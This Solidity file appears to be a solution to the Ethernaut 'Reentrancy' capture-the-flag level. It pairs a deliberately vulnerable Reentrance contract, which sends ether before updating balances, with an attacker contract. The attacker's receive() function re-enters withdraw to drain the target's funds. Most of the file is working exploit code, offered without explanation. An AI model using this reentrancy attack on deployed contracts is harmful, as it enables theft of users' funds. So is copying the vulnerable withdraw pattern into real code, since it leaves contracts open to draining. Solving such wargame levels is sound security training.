// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IDeployedInstance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    console.log('inside Reentrance.withdraw() balance(msg.sender): ', balances[msg.sender]);
    if (balances[msg.sender] >= _amount) {
        console.log('before withdrawing');
        (bool result,) = msg.sender.call{value:_amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
        console.log('inside Reentrance.withdraw() after withdraw(). balance(msg.sender): ', balances[msg.sender]);
    } else {
        console.log('not withdrawn!');
    }
  }

  receive() external payable {}
}

contract EthernautReentrancy {
    // IDeployedInstance public instanceContract;
    Reentrance public instanceContract;
    address instanceContractAddress;

    constructor(address payable _instanceContractAddress) {
        // instanceContract = IDeployedInstance(_instanceContractAddress);
        instanceContract = Reentrance(_instanceContractAddress);
        instanceContractAddress = _instanceContractAddress;
    }

    function donate() public payable {
        bytes memory data = abi.encodeWithSignature('donate(address)', address(this));
        (bool success, ) = address(instanceContractAddress).call{value: msg.value}(data);
        // console.log('donate.success: ', success);
    }

    function withdraw(uint amount) public {
        instanceContract.withdraw(amount);
    }

    receive() external payable {
        uint totalBalance = address(instanceContractAddress).balance;
        uint myBalance = address(this).balance;
        console.log("inside receive(). totalBalance: ", totalBalance, "my balance: ", myBalance);
        if (totalBalance > 0) {
            // console.log('calling withdraw again');
            instanceContract.withdraw(msg.value);
        // } else {
            // console.log('totalBalance <= 0');
        }
    }
}
